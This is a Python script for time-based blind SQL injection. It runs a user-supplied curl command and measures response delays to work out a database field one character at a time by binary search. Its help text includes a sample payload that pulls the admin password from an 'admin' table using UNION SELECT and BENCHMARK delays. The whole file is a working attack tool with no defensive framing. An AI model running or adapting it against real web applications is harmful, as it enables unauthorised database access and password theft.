#!/usr/bin/python
import sys
import argparse
import time
import subprocess

def replace_tags(curl_request, cposition, cinteger):
	request = curl_request.replace(template_character_position, cposition)
	request = request.replace(template_character_integer, cinteger)
	return request

def call_request(curl_request):
	start = time.time()
	subprocess.check_output(curl_request, shell=True)
	finish = time.time()
	return finish-start

if __name__ == "__main__":
	# option parsing
	parser = argparse.ArgumentParser(description="Curl based blind-sql-injection execute the given curl request and replace some of it's part to induce the content of a chosen field", epilog="EXAMPLE: ./s.py --latency 0.6 \"curl --data \\\"username=a' UNION ALL SELECT IF(ASCII(SUBSTRING((SELECT password FROM admin WHERE username ='admin'),{p},1)){i},1,BENCHMARK(1500000,MD5(1)));#\\\" --other-curl-options \"")
	parser.add_argument("-P", "--template-character-position", default="{p}", dest="template_character_position", metavar="P", type=str, help="the tag to be replaced for the character position. DEFAULT {p}")
	parser.add_argument("-I", "--template-character-integer", default="{i}", dest="template_character_integer", metavar="I", type=str, help="the field tag to be replaced for the integer comparison. DEFAULT {i}")
	parser.add_argument("-l", "--latency", default=0.6, dest="latency", metavar="LATENCY", type=float, help="lower this value when request is fast")
	parser.add_argument("-s", "--start-char", default=1, dest="start_char", metavar="START_CHAR", type=int, help="at what char we start (inclusive)")
	parser.add_argument("-e", "--end-char", default=32, dest="end_char", metavar="END_CHAR", type=int, help="at what char we end (inclusive)")
	parser.add_argument("curl_request", metavar="CURL_REQUEST", type=str, help="the raw curl request.")
	
	args = parser.parse_args()
	
	curl_request_original = args.curl_request
	template_character_position = args.template_character_position
	template_character_integer = args.template_character_integer
	latency = args.latency
	start_char = args.start_char
	end_char = args.end_char
	string_to_find = ""
	print("Latency setting:" +str(latency))
	for i in range(start_char,end_char+1):
		character_integer = 128	
		maximum = 256
		minimum = 0
		while(character_integer%2==0):
			curl_request = replace_tags(curl_request_original, str(i), "<"+str(character_integer))
			call_latency = call_request(curl_request)
			print("call_latency vs latency value:"+str(call_latency) + " ~ " + str(latency))
			if call_latency > latency:
				minimum = character_integer
			else:
				maximum = character_integer
			character_integer = (maximum+minimum)/2
			print("max:"+str(maximum)+" min:"+str(minimum)+" integer:"+str(character_integer))
		
		
		curl_request = replace_tags(curl_request_original, str(i), "="+str(character_integer+1))
		call_latency = call_request(curl_request)
		if call_latency > latency:
			curl_request = replace_tags(curl_request_original, str(i), "="+str(character_integer-1))
			call_latency = call_request(curl_request)
			if call_latency < latency:
				character_integer -= 1
		else:
			character_integer += 1
		string_to_find += chr(int(character_integer))
		print("~"*int(end_char-start_char+1))
		print(string_to_find)
		print("_"*int(end_char-start_char+1))
	
	print(string_to_find)

	sys.exit(0)


